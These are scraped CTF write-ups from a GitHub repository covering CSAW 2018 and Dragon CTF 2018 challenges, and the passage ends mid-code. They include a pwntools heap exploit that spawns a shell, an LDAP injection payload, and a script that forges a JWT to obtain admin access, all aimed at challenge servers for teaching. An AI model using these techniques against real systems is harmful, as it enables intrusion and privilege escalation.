content:\n\t\tsh.send(content)\n\telse:\n\t\tsh.send(ret)\n\tsh.recvuntil(\"Brood mother, what tasks do we have today.\\n\")\n\treturn ret\n\nsh.recvuntil(\"Daimyo, nani o shitaidesu ka?\\n\")\nsh.send(\"1\\n\")\nsh.recvuntil(\"What is my weapon's name?\\n\")\nsh.send(\"1\\n\")\nsh.recvuntil(\"Daimyo, nani o shitaidesu ka?\\n\")\nsh.send(\"3\\n\")\n#use samurai to put malloc hook to 0\n\nsh.recvuntil(\"Brood mother, what tasks do we have today.\\n\")\ncreate(0x10, \"fastbin\") #0\ncreate(0x10, \"fastbin\") #1\ndelete(0)\ndelete(1)\n#prepare some 0x20 fastbin\n\ncreate(0x210, \"a\") #2\ncreate(0x100, \"c\") #3\ncreate(0x100, \"padding\") #4\n\ndelete(2)\ncreate(0x108, \"a\" * 0x108) #5\n#0x111 -> 0x100\n#0x20 fastbin *1\n\ncreate(0x80, \"b1\") #6\ncreate(0x100 - 0x90 - 0x20 - 0x10, \"b2b2b2b2b2b2b2b2\") #7\n\ndelete(6)\ndelete(3)\n#0x221 unsorted bin\n#0x20 *2\n\ncreate(0xa0, \"consume unsorted + leak\") # 8\nlibc_addr = u64(editidx(7) + \"\\x00\\x00\") - UNSORTED_OFF\nprint hex(libc_addr)\ndelete(8)\n#recover to 0x221 unsorted bin\n#0x20 *2\n\ncreate(0xa0, \"A\" * 0x88 + p64(0x21) + p64(libc_addr + e.symbols[\"environ\"]) + p64(0xdeadbeef)) # 9\nstack_addr = u64(editidx(7) + \"\\x00\\x00\")\nprint hex(stack_addr)\ndelete(9)\n#leak = 0xe58\n\n#0xd48 -> one_gadget 0x30\ncreate(0xa0, \"A\" * 0x88 + p64(0x21) + p64(stack_addr - 0xe58 + 0xd48) + p64(0xdeadbeef)) # 10\neditidx(7, p64(libc_addr + ONE_GADGET_OFF))\ndelete(10)\n\n\n#0xd80 -> 0\ncreate(0xa0, \"A\" * 0x88 + p64(0x21) + p64(stack_addr - 0xe58 + 0xd80) + p64(0xdeadbeef)) # 11\neditidx(7, p64(0))\ndelete(11)\n\nsh.interactive()\n```\n\n## 50 Reversing / A Tour of x86 - Part 1 ##\n\n**Description**\n\n> Newbs only!\n> \n> `nc rev.chal.csaw.io 9003`\n> \n> -Elyk\n> \n> Edit (09/15 12:30 AM) - Uploaded new stage-2.bin to make Part 2 easier.\n\n**Files provided**\n\n - [`stage-1.asm`](files/x86-1-stage-1.asm)\n - [`Makefile`](files/x86-1-Makefile)\n - [`stage-2.bin`](files/x86-1-stage-2.bin)\n\n**Solution**\n\nThis challenge is meant to be an introduction to x86 assembly. For this challenge, we are provided with [`stage-1.asm`](files/x86-1-stage-1.asm), [`Makefile`](files/x86-1-Makefile), [`stage-2.bin`](files/x86-1-stage-2.bin) but all we really need [`stage-1.asm`](files/x86-1-stage-1.asm). This file is heavily commented, explaining instructions. In order to get the flag, we need to answer 5 questions. The code is running in 16 bit mode.\n\n**Question 1**\n> What is the value of dh after line 129 executes? (Answer with a one-byte hex value, prefixed with '0x')\n\nLet's go and look at the code\n```asm\n  ; There are other ways to make a register be set to zero... I hope you know your binary operators (and, or, not, xor, compliments)\n  xor dh, dh  ; <- Question 1 (line 129)\n```\nThe size of the register dh is 8 bits. We xor the value in the register dh with itself and put the value in dh.\nXoring 2 values that are same returns 0, therefore the result stored in dh (in hexadecimal) after line 129 executes is `0x00`.\n\n**Question 2**\n> What is the value of gs after line 145 executes? (Answer with a one-byte hex value, prefixed with '0x')\n\nLet's look at the code.\n```asm\n  cmp dx, 0\n  jne .death  ; This time jumping backwards to a label we passed... Saves duplicate code.\n\n  ; Alright, recruits! New registers!\n  ; These are called segment registers and are all 16-bits only.\n  ; ...Yeah...\n  ; Fuckin' useless.\n\n  mov ds, ax ; Oh yeah so this time since\n  mov es, bx ; the other registers are\n  mov fs, cx ; already zero, I'm just going\n  mov gs, dx ; to use them to help me clear     <- Question 2 (line 145)\n  mov ss, ax ; these registers out.\n```\nThe fist line of the code snippet compares dx with 0 and the line after that say to jump to the label .death if dx does not equal 0.\nAlso reading the the comments on line 145 we can immediately say that the register gs contains the value (in hexadecimal) `0x00`. \n\n**Question 3**\n> What is the value of si after line 151 executes? (Answer with a two-byte hex value, prefixed with '0x')\n\nLet's look at the code.\n\n```asm\n  mov cx, 0 ; (line 107)\n\n\n  ; Many of these registers actually have names, but they're mostly irrelevant and just legacy.\n  mov sp, cx ; Stack Pointer   (line 149)\n  mov bp, dx ; Base Pointer\n  mov si, sp ; Source Index       <- Question 3 (line 151)\n```\nThe registers cx, sp and si are of size 16 bits. cx is set to 0 on line 107 and then the stack pointer is set to the value stored in cx on line 149. \nThe source index is set to the value stored in the source pointer on line 151. Therefore after line 151 is executed the source index contains the value `0x0000`.\n\n**Question 4**\n> What is the value of ax after line 169 executes? (Answer with a two-byte hex value, prefixed with '0x')\n\n```asm\n  mov al, 't'\n  mov ah, 0x0e      ; <- Question 4 (line 169)\n```\n\nThe register ax is 16 bits longs. The top 8 bits can be modified using the register ah and the bottom 8 bits can be modified using the register al. After line 169 is executed, ah contains the value 0x0e and the register al contains the value 0x74 ('t' in hexadecimal). Therefore the register ax contains the value `0x0e74`.\n\n\n\n\n\n**Question 5**\n> What is the value of ax after line 199 executes for the first time? (Answer with a two-byte hex value, prefixed with '0x')\n\n```asm\n  mov ax, .string_to_print\n  jmp print_string\n  .string_to_print: db \"acOS\", 0x0a, 0x0d, \"  by Elyk\", 0x00  ; label: <size-of-elements> <array-of-elements>\n  ; db stands for define-bytes, there's db, dw, dd, dq, dt, do, dy, and dz.  I just learned that three of those exist.  It's not really assembly-specific knowledge. It's okay.  https://www.nasm.us/doc/nasmdoc3.html\n    ; The array can be in the form of a \"string\" or comma,separate,values,.\n\n; Now let's make a whole 'function' that prints a string\nprint_string:\n  .init:\n    mov si, ax  ; We have no syntactic way of passing parameters, so I'm just going to pass the first argument of a function through ax - the string to print. (line 189)\n\n  .print_char_loop:\n    cmp byte [si], 0  ; The brackets around an expression is interpreted as \"the address of\" whatever that expression is.. It's exactly the same as the dereference operator in C-like languages\n                        ; So in this case, si is a pointer (which is a copy of the pointer from ax (line 183), which is the first \"argument\" to this \"function\", which is the pointer to the string we are trying to print)\n                        ; If we are currently pointing at a null-byte, we have the end of the string... Using null-terminated strings (the zero at the end of the string definition at line 178)\n    je .end\n   \n    mov al, [si]  ; Since this is treated as a dereference of si, we are getting the BYTE AT si... `al = *si`\n\n    mov ah, 0x0e  ; <- Question 5 (line 199)\n    int 0x10      ; Actually print the character\n \n    inc si        ; Increment the pointer, get to the next character\n    jmp .print_char_loop\n```\n\nThe register si contains the pointer the .string_to_print. Iterating through the loop the first time, we compare the value of the pointer that si is pointing to and check to see if it is 0 (null byte). The value of the pointer that si is pointing to is 'a' therefore we do not jump to the .end label and assign 'a' (0x61 in hexadecimal) to the register al. We then assign the value 0x0e to the register ah. Therefore the register ax contains the value `0x0e61`.\n\nAfter answering this final question, the server gives us the flag.\n\n`flag{rev_up_y0ur_3ng1nes_reeeeeeeeeeeeecruit5!}`\n\n\n## 100 Reversing / A Tour of x86 - Part 2 ##\n\n**Description**\n\n> Open stage2 in a disassembler, and figure out how to jump to the rest of the code!\n> \n> -Elyk\n> \n> Edit (09/15 12:30 AM) - Uploaded new stage-2.bin to make the challenge easier\n\n**Files provided**\n\n - [`stage-1.asm`](files/x86-1-stage-1.asm)\n - [`Makefile`](files/x86-1-Makefile)\n - [`stage-2.bin`](files/x86-1-stage-2.bin)\n\n**Solution**\n\n(TODO)\n\n## 200 Reversing / A Tour of x86 - Part 3 ##\n\n**Description**\n\n> The final boss!\n> \n> Time to pull together your knowledge of Bash, Python, and stupidly-low-level assembly!!\n> \n> This time you have to write some assembly that we're going to run.. You'll see the output of your code through VNC for 60 seconds.\n> \n> Objective: Print the flag.\n> \n> What to know:\n> \n> Strings need to be alternating between the character you want to print and '0x1f'.\n> \n> To print a string you need to write those alternating bytes to the frame buffer (starting at 0x00b8000...just do it). Increment your pointer to move through this buffer.\n> \n> If you're having difficulty figuring out where the flag is stored in memory, this code snippet might help you out:\n> \n>     get_ip:\n>       call next_line\n>       next_line:\n>       pop rax\n>     ret\n> \n> That'll put the address of `pop rax` into rax.\n> \n> Call serves as an alias for `push rip` (the instruction pointer - where we are in code) followed by `jmp _____` where whatever is next to the call fills in the blank.\n> \n> And in case this comes up, you shouldn't need to know where you are loaded in memory if you use that above snippet...\n> \n> Happy Reversing!!\n> \n> `nc rev.chal.csaw.io 9004`\n> \n> - Elyk\n> \n> Edit (09/16 1:13 AM) - Uploaded new files. No change in challenge difficulty or progression, simply streamlining the build process.\n\n**Files provided**\n\n - [`Makefile`](files/x86-3-Makefile)\n - [`part-3-server.py`](files/x86-3-part-3-server.py)\n - [`tacOS-base.bin`](files/x86-3-tacOS-base.bin)\n\n**Solution**\n\nFrom the `part-3-server.py` script we can see what happens on connection – we provide the hexdump for our assembly code, it gets linked with the previous stages and executed on a VNC. What is most important, however, is that the flag is added to the end of our code.\n\nSo we simply need to read the flag from after our location in memory (related to the `rip` register, hence the snippet in the description), and write it to the screen. `0x000b8000` is a special location in memory – it is mapped directly to text display in protected mode. We write the character values in even positions in the memory, and we write background / foreground colour settings in odd positions in the memory.\n\n```asm\nbits 32\n\npart3:\n  mov esi, 0x000b8000   ; video memory location\n  call get_ip           ; = mov ebx, (position of pop ebx in get_ip)\n  mov edx, 512          ; read 512 characters\n._mov_loop:\n  cmp edx, 0\n  jz .end               ; jump to .end if done\n  sub edx, 1\n  mov ecx, [ebx]        ; read a character from memory\n  mov byte [esi], cl    ; move it into video memory\n  add esi, 1\n  mov byte [esi], 0x1F  ; white-on-blue text\n  add esi, 1\n  add ebx, 1\n  jmp ._mov_loop\n.end:\n  jmp .end              ; infinite loop to keep the VNC running\n\nget_ip:\n  call next_line\nnext_line:\n  pop ebx\n  ret\n```\n\n`flag{S4l1y_Se11S_tacOShell_c0d3_bY_tHe_Se4_Sh0re}`\n\n## 500 Reversing / kvm ##\n\n**Description**\n\n> We found a mysterious program that none of our most talented hackers could even begin to figure out.\n> \n> Author: toshi\n\n**Files provided**\n\n - [`challenge`](files/kvm-challenge)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe OS is obsfucated by using `hlt` instruction to implement the conditional or unconditional `jmp`, so we can patch it first\n\n```python\nhlt_tab = {0xc50b6060 : 0x454,\n0x9d1fe433 : 0x3ed,\n0x54a15b03 : 0x376,\n0x8f6e2804 : 0x422,\n0x8aeef509 : 0x389,\n0x3493310d : 0x32c,\n0x59c33d0f : 0x3e1,\n0x968630d0 : 0x400,\n0xef5bdd13 : 0x435,\n0x64d8a529 : 0x3b8,\n0x5f291a64 : 0x441,\n0x5de72dd : 0x347,\n0xfc2ff49f : 0x3ce}\ntext_end = 0x611\ndef replace_jmps(start,end):\n\tfor p in xrange(start,end):\n\t\tif Byte(p) == 0xB8 and Byte(p + 5) == 0xF4 and Dword(p + 1) in hlt_tab:\n\t\t\tjmp_addr = hlt_tab[Dword(p + 1)]\n\t\t\tPatchByte(p, 0xE9)\n\t\t\tPatchDword(p + 1, (jmp_addr - (p + 5)) & 0xffffffff)\n\t\t\tPatchByte(p + 5, 0x90)\n\t\t#Patch to hlt to jmp\n```\n\nThere are only 4 conditional `jmp`, so analyze them by hand. Also, edit the function to extend it, so that the analysis in IDA will be easier.\n\nAfter some reversing, we found that the program is a Huffman Tree. It will encode the input into the path going from root node to the corresponding leaf node, but in reversed order(which makes decoding very hard, since the ambiguity exists).\n\nI got stucked in the algorithm for 3 hours, will add more details later if I have time.\n\n```python\nROOT_OFF = 0x1300\ndef MyQword(addr):\n\tret = Qword(addr)\n\tif ret == 0xFFFFFFFFFFFFFFFF:\n\t\treturn 0\n\telse:\n\t\treturn ret\ndef MyByte(addr):\n\tret = Byte(addr)\n\tif ret == 0xFF:\n\t\treturn 0\n\telse:\n\t\treturn ret\n\n#dfs to get the mapping\ndef get_path_to_char(node):\n\tif MyQword(node) != 0xFF:\n\t\treturn [([],chr(MyQword(node)))]\n\tright = MyQword(node + 0x10)\n\tleft = MyQword(node + 8)\n\tret = []\n\tlmap = get_path_to_char(left)\n\tfor (p, c) in lmap:\n\t\tret.append((p + [0], c))\n\trmap = get_path_to_char(right)\n\tfor (p, c) in rmap:\n\t\tret.append((p + [1], c))\n\treturn ret\n\ndef begin_with(l, sl):\n\tif len(sl) > len(l):\n\t\treturn False\n\tfor i in xrange(0, len(sl)):\n\t\tif l[i] != sl[i]:\n\t\t\treturn False\n\treturn True\n# recursion too long!!!\n# #return lsit of strings of possibilities\n# def get_all_poss(bits, mapping, pad):\n# \tposs = []\n# \tfor (p,c) in mapping:\n# \t\tif begin_with(bits, p):\n# \t\t\tposs.append((len(p), c))\n# \tret = []\n# \tfor x in poss:\n# \t\t#print poss\n# \t\tprint pad * ' ' + x[1]\n# \t\tret += map(lambda st : x[1] + st, get_all_poss(bits[x[0]:], mapping, pad + 1))\n# \t#print ret\n# \treturn ret\n\n#return lsit of strings of possibilities\ndef get_all_poss(obits, mapping, pad):\n\tlive_bits = [(\"\",obits)]\n\twhile len(live_bits) != 1 or len(live_bits[0][1]) != 0:\n\t\t(parsed,bits) = live_bits.pop()\n\t\tposs = []\n\t\tfor (p,c) in mapping:\n\t\t\tif begin_with(bits, p):\n\t\t\t\tposs.append((len(p), c))\n\t\t#get all poss\n\t\tfor x in poss:\n\t\t\t#print x\n\t\t\tlive_bits.append((parsed + x[1],bits[x[0]:]))\n\t\t#if len(live_bits) == 1:\n\t\tprint live_bits\n\treturn live_bits\n\ndef recover(data):\n\tret = []\n\tbits = []\n\tfor x in data:\n\t\tfor i in range(0,8):\n\t\t\tif x & (1 << i) != 0:\n\t\t\t\tbits.append(1)\n\t\t\telse:\n\t\t\t\tbits.append(0)\n\tprint bits\n\tmapping = get_path_to_char(ROOT_OFF)\n\t#while len(bits) > 0: loop does not work well for ambiguoutyt\n\tret = get_all_poss(bits, mapping, 0)\n\treturn ret\n\n# fails because it is in reverse order\n# def recover(data):\n# \tret = []\n# \tcur_node = ROOT_OFF\n# \tfor x in data:\n# \t\tfor i in range(0,8)[::-1]:\n# \t\t\tprint hex(cur_node)\n# \t\t\tif x & (1 << i) != 0: #r\n# \t\t\t\tcur_node = MyQword(cur_node + 0x10)\n# \t\t\telse:\n# \t\t\t\tcur_node = MyQword(cur_node + 8)\n# \t\t\tif MyQword(cur_node) != 0xff:\n# \t\t\t\tret.append(MyQword(cur_node))\n# \t\t\t\tcur_node = ROOT_OFF\n# \treturn ret\n```\n\nEven in the end I did not get the original input, but I've already got the flag, which is part of the input.\n\n## 50 Web / Ldab ##\n\n**Description**\n\n> _dab_\n> \n> `http://web.chal.csaw.io:8080`\n\n**No files provided**\n\n**Solution**\n\nWe can see a directory of users:\n\n![](screens/ldab.png)\n\nThe weird column names and the title of the challenge can quickly lead us to finding out about Lightweight Directory Access Protocol (LDAP). More specifically, [LDAP filters](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol#Search_and_Compare) and even better - [LDAP injection](https://www.owasp.org/index.php/Testing_for_LDAP_Injection_%28OTG-INPVAL-006%29).\n\nA simple way to verify if the page is vulnerable is with test strings like `*` (should show all users), `Pete*` / `P*te` (should show Pete), before moving on to injections with `(` and `)`.\n\nThe page always shows results with `OU` (object class?) value of `Employees`, and whatever we type into the search box must match the `GivenName` column. Presumably there is an entry in the database that never shows up, which will contain the flag itself. This is the filter used (shamelessly stolen from the source):\n\n    filter: (&(objectClass=person)(&(givenName=<input>)(!(givenName=Flag))))\n    intended meaning:\n      (objectClass is person)\n      AND\n      (\n        (givenName is <input>)\n        AND\n        NOT(givenName is Flag)\n      )\n\nWe can verify this is the case without much damage (yet):\n\n    input:  *)(givenName=Pete\n    filter: (&(objectClass=person)(&(givenName=*)(givenName=Pete)(!(givenName=Flag))))\n    meaning:\n      (objectClass is person)\n      AND\n      (\n        (givenName is any)\n        AND\n        (givenName is Pete)\n        AND\n        NOT(givenName is Flag)\n      )\n\nAnd indeed, only Pete shows up. Let's try a proper injection:\n\n    input:  *))(|(objectClass=*\n    filter: (&(objectClass=person)(&(givenName=*))(|(objectClass=*)(!(givenName=Flag))))\n    meaning:\n      (objectClass is person)\n      AND\n      (\n        (givenName is any)\n      )\n      AND\n      (\n        (objectClass is ANY)\n        OR\n        NOT(givenName is Flag)\n      )\n\nAs you can see, the flag exclusion mechanism became optional (either the entry is not the flag OR its object class is any, which is always true). And with that, we can see the flag:\n\n`flag{ld4p_inj3ction_i5_a_th1ng}`\n\n## 100 Web / sso ##\n\n**Description**\n\n> Don't you love undocumented APIs\n> \n> Be the `admin` you were always meant to be\n> \n> http://web.chal.csaw.io:9000\n> \n> Update chal description at: 4:38 to include solve details\n> \n> Aesthetic update for chal at Sun 7:25 AM\n\n**No files provided**\n\n**Solution**\n\nWe start at a rather empty website.\n\n```html\n<h1>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!</h1>\n<a href=\"/protected\">.</a>\n<!--\nWish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess\nPOST /oauth2/token\nPOST /oauth2/authorize form-data TODO: make a form for this route\n-->\n```\n\nTrying to go to `/protected` results in the page telling us:\n\n    Missing header: Authorization\n\nIf we try to do a `POST` request to the two URLs given in the comment:\n\n    $ curl -X POST http://web.chal.csaw.io:9000/oauth2/token\n    incorrect grant_type\n    $ curl -X POST http://web.chal.csaw.io:9000/oauth2/authorize\n    response_type not code\n\nOAuth 2.0 is a very widespread mechanism for logins and registrations. It is quite easy to find articles referencing how it works, and both `grant_type` and `response_type`. [Here](https://alexbilbie.com/guide-to-oauth-2-grants/) is a good one.\n\nSo, our first step is to make a POST request to the authorisation server, which is represented by the `/oauth2/authorize` URL in our case:\n\n    $ curl -X POST -d \"response_type=code\" \\\n      -d \"client_id=admin\" \\\n      --data-urlencode \"redirect_uri=http://web.chal.csaw.io:9000/protected\" \\\n      -d \"state=admin\" \\\n      -d \"scope=admin\" \\\n      \"http://web.chal.csaw.io:9000/oauth2/authorize\"\n    Redirecting to <a href=\"http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhZG1pbiIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly93ZWIuY2hhbC5jc2F3LmlvOjkwMDAvcHJvdGVjdGVkIiwiaWF0IjoxNTM3Mjk3OTc0LCJleHAiOjE1MzcyOTg1NzR9.gwpoCKI2ZyGAgZlQ3J50j7H-pXWH3HaLLb5sDeblr8I&amp;state=admin\">http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhZG1pbiIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly93ZWIuY2hhbC5jc2F3LmlvOjkwMDAvcHJvdGVjdGVkIiwiaWF0IjoxNTM3Mjk3OTc0LCJleHAiOjE1MzcyOTg1NzR9.gwpoCKI2ZyGAgZlQ3J50j7H-pXWH3HaLLb5sDeblr8I&amp;state=admin</a>\n\nThe `code` URL in the above gives us a token which we then submit to the `/oauth2/token` URL:\n\n    $ curl -X POST -d \"grant_type=authorization_code\" \\\n      -d \"client_id=admin\" \\\n      -d \"client_secret=admin\" \\\n      --data-urlencode \"redirect_uri=http://web.chal.csaw.io:9000/protected\" \\\n      -d \"code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhZG1pbiIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly93ZWIuY2hhbC5jc2F3LmlvOjkwMDAvcHJvdGVjdGVkIiwiaWF0IjoxNTM3Mjk3OTc0LCJleHAiOjE1MzcyOTg1NzR9.gwpoCKI2ZyGAgZlQ3J50j7H-pXWH3HaLLb5sDeblr8I\" \\\n      \"http://web.chal.csaw.io:9000/oauth2/token\"\n    {\"token_type\":\"Bearer\",\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzI5ODAxOCwiZXhwIjoxNTM3Mjk4NjE4fQ.4HWHo1doTgWejr-jTTdeYoFMKpuiLvT9-I3jSushkNk\"}\n\nAnd with this token we can try to go to `/protected`!\n\n    $ curl -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzI5ODAxOCwiZXhwIjoxNTM3Mjk4NjE4fQ.4HWHo1doTgWejr-jTTdeYoFMKpuiLvT9-I3jSushkNk\" \\\n      \"http://web.chal.csaw.io:9000/protected\"\n    You must be admin to access this resource\n\nBut of course, that would have been too simple. Even though we put `admin` in basically all the parameters, we are not admins to the server. Let's have a look at the token though. It seems to be a couple of Base64-encoded strings:\n\n    $ printf \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\" | base64 -D\n    {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n    $ printf \"eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzI5ODAxOCwiZXhwIjoxNTM3Mjk4NjE4fQ==\" | base64 -D\n    {\"type\":\"user\",\"secret\":\"ufoundme!\",\"iat\":1537298018,\"exp\":1537298618}\n    $ printf \"4HWHo1doTgWejr-jTTdeYoFMKpuiLvT9-I3jSushkNk=\" | base64 -D | xxd\n    0000000: e075 87a3 5768 4e05 9e8e bfa3 4d37 5e62  .u..WhN.....M7^b\n    0000010: 814c 2a9b a22e f4fd f88d e34a eb21 90d9  .L*........J.!..\n\n(I added `=` characters to the end of the second and third strings in order to make their lengths a multiple of 4, i.e. standard Base64 padding.)\n\nThe `JWT` bit is particularly interesting. JWT stands for [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token), and is a simple format for issuing tokens from the server to the client that cannot easily be manipulated. The contents of the token are signed with a key only the server knows and the signature is attached to the token. If either changes, the token is rejected. But ... we have a `secret` value in the payload (the second part of the token)! Let's assume it is the signing key and forge the token such that our `type` is `admin` instead of `user`.\n\n```python\nimport hmac\nimport hashlib\nimport base64\n\n# the header is the same\nheaderData = b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}'\nheaderB64 = base64.b64encode(headerData, \"-_\").strip(\"=\")\n\n# modified payload\n# - set the type to admin\n# - remove the secret (why not)\n# - extend the expiry timestamp\npayloadData = b'{\"type\":\"admin\",\"iat\":1537298018,\"exp\":1608495620}'\npayloadB64 = base64.b64encode(payloadData, \"-_\").strip(\"=\")\n\nsecret = \"ufoundme!\"\ntoDigest = bytes(headerB64 + \".\" + payloadB64)\nsignature = hmac.new(secret, toDigest, digestmod = hashlib.sha256).digest()\nsignatureB64 = base64.b64encode(signature, \"-_\").strip(\"=\")\n\nprint \".\".join([headerB64, payloadB64, signatureB64])\n```\n\n    $ python token.py\n    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1MzcyOTgwMTgsImV4cCI6MTYwODQ5NTYyMH0.ULVv8Amb2Ai1R57Sr3mPhtU9q-et4ttN2kudnoZrwl0\n\nAnd with this modified token:\n\n    $ curl -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1MzcyOTgwMTgsImV4cCI6MTYwODQ5NTYyMH0.ULVv8Amb2Ai1R57Sr3mPhtU9q-et4ttN2kudnoZrwl0\" \\\n      \"http://web.chal.csaw.io:9000/protected\"\n\nWe get the flag!\n\n`flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}`\n", "timestamp": "2025-10-24T11:39:08.454747"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-09-14-CSAW-CTF-Quals/files/babycrypto-ciphertext.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-09-14-CSAW-CTF-Quals/files/babycrypto-ciphertext.txt", "content": "s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg==", "timestamp": "2025-10-24T11:39:08.947115"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-09-29-Teaser-Dragon-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-09-29-Teaser-Dragon-CTF/README.md", "content": "# 2018-09-29-Teaser-Dragon-CTF #\n\n[CTFTime link](https://ctftime.org/event/648) | [Website](https://ctf.dragonsector.pl/)\n\n---\n\n## Challenges ##\n\n - [ ] 219 Cryptography / AES-128-TSB\n - [x] [176 RE / Brutal Oldskull](#176-re--brutal-oldskull)\n - [ ] 391 RE / Chains of Trust\n - [ ] 432 Cryptography / cryptovm\n - [x] [400 Pwning / Fast Storage](#400-pwning--fast-storage)\n - [ ] 330 Web / Nodepad\n - [ ] 343 Pwning / Production\n - [x] 78 Miscellaneous / Sanity check\n - [x] [278 Web / 3NTERPRISE solution](#278-web--3nterprise-solution)\n \n---\n\n## 176 RE / Brutal Oldskull ##\n\n**Description**\n\n> The '90s called and wanted their crackme back. It's basically a walk in a park.\n\n**Files provided**\n\n - [`oldskull.exe`](files/oldskull.exe)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe program is written in classical win32 API, which is covered in the book \"Windows Programming\", and I will not detail this programming part.\n\nThe program asked us to input 4 16-bit hex number, and they will then be processed in this way:\n\n```c\n  a1 = (char *)trans_input(::a1, 0x4C8Eu, inputs[0]);\n  if ( a1 )\n  {\n    v17 = (char *)trans_input(a1, 0x4C6Eu, inputs[1]);\n    if ( v17 )\n    {\n      v16 = (char *)trans_input(v17, 0x4C4Eu, inputs[2]);\n      if ( v16 )\n      {\n        v15 = trans_input(v16, 0x4C2Eu, inputs[3]);\n        if ( v15 )\n        {\n            //we need to go here!\n        }\n      }\n    }\n  }\n```\n\nThe `trans_input` function, `0x004016E4`\n\n```c\nvoid *__cdecl trans_input(char *a1, size_t size, unsigned int a3)\n{\n  unsigned __int16 input; // [esp+1Ch] [ebp-3Ch]\n  char hash[40]; // [esp+20h] [ebp-38h]\n  char *ret; // [esp+48h] [ebp-10h]\n  size_t i; // [esp+4Ch] [ebp-Ch]\n\n  input = a3;\n  ret = (char *)malloc(size);\n  memset(ret, 0, size);\n  for ( i = 0; i < size; ++i )\n  {\n    ret[i] = (a1[i] ^ input) - HIBYTE(input);\n    input *= 0x62F3;\n  }//decode the data using the key given\n  memset(hash, 0, sizeof(hash));\n  md5(ret, size - 32, hash);//found this is a md5 by debugging\n    //result will be putted as hex string\n  if ( !memcmp(hash, &ret[size - 32], 0x20u) )\n    return ret;//last 0x20 bytes must be md5 hashes of previous bytes\n  free(ret);\n  return 0;\n}\n```\n\nInitially, I would like to bruteforce the md5. However, what we need to do is to test all `0x10000` possibilities, and print the value if the last `0x20` bytes are hex string. This is already enough to get the value.\n\nThe code is quite ugly, since this is a CTF instead of a software engineering design.\n\n```c\n#include <stdio.h>\nchar data[19616];\nvoid getdata()\n{\n\tFILE* f = fopen(\"oldskull.exe\", \"rb\");\n\tfseek(f, 0x4020, 0);\n\tfread(data,sizeof(data),1,f);\n\tfclose(f);\n}\n\nchar* trans_input(char *a1, size_t size, unsigned int a3)\n{\n\tunsigned short input; // [esp+1Ch] [ebp-3Ch]\n\tchar *ret; // [esp+48h] [ebp-10h]\n\tsize_t i; // [esp+4Ch] [ebp-Ch]\n\n\tinput = a3;\n\tret = (char *)malloc(size);\n\tmemset(ret, 0, size);\n\tfor ( i = 0; i < size; ++i )\n\t{\n\t\tret[i] = (a1[i] ^ input) - (input >> 8);\n\t\tinput *= 0x62F3;\n\t}\n\treturn ret;\n}\n\nint ismd5(char* buf)\n{\n\tfor (int i = 0; i < 0x20; ++i)\n\t{\n\t\tchar c = buf[i];\n\t\tif (!(c >= '0' && c <= '9' || c >= 'a' && c <= 'f'))\n\t\t{\n\t\t\treturn 0;\n\t\t}\n\t}\n\treturn 1;\n}\n\nint main(int argc, char const *argv[])\n{\n\tgetdata();\n\tchar* ret;\n\tfor (unsigned int i = 0; i < 0x10000; ++i)\n\t{\n\t\tret = trans_input(data, 0x4C8E, i);\n\t\tif (ismd5(ret + 0x4C8E - 0x20))\n\t\t{\n\t\t\tprintf(\"%x\\n\", i);\n\t\t\tmemcpy(data, ret, 0x4c8E);\n\t\t}\n\t\tfree(ret);\n\t}\n\tfor (unsigned int i = 0; i < 0x10000; ++i)\n\t{\n\t\tret = trans_input(data, 0x4C8E - 0x20, i);\n\t\tif (ismd5(ret + 0x4C8E - 0x20 * 2))\n\t\t{\n\t\t\tprintf(\"%x\\n\", i);\n\t\t\tmemcpy(data, ret, 